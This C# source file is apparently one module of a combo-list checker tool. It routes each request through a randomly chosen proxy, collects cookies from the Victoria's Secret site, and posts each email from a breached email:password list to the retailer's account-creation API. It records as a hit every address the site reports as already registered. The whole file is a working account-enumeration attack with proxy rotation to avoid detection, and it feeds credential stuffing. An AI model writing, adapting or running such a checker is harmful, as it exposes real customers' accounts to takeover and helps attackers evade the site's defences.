using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class victoriassecret
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowAutoRedirect = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                string str1 = httpRequest.Get("https://www.victoriassecret.com/").ToString();
                string dtcook = httpRequest.Cookies.GetCookies("https://www.victoriassecret.com/")["dtCookie"].ToString();
                string cfbm = httpRequest.Cookies.GetCookies("https://www.victoriassecret.com/")["__cf_bm"].ToString();
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("origin", "https://www.victoriassecret.com");
                httpRequest.AddHeader("referer", "https://www.victoriassecret.com/");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36");
                string str2 = httpRequest.Post("https://api.victoriassecret.com/auth/v18/create-account-vs", "{\"email\":\"" + strArray1[0] + "\",\"password\":\"23147052f-s_asdAS\",\"firstName\":\"roberto\",\"countryCode\":\"US\",\"channel\":\"VSWEB\",\"forceSaveAddress\":false,\"optInsVs\":{\"emailOptIn\":\"optIn\",\"mailOptIn\":\"notCollected\",\"smsOptIn\":\"notCollected\"}}", "text/plain").ToString();
                if (str2.Contains("Email address you entered is already in use. If you already have an account, sign in now."))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "VictoriasSecret VM");
                    return true;
                }
                else if (!str2.Contains("Email address you entered is already in use. If you already have an account, sign in now."))
                {
                    Interlocked.Increment(ref Program.Fail);
                    Interlocked.Increment(ref Program.Check);
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else
                {
                    ++Program.Error;
                    return false;
                }

            }
            catch
            {
                ++Program.Error;
                return false;
            }
        }
    }
}
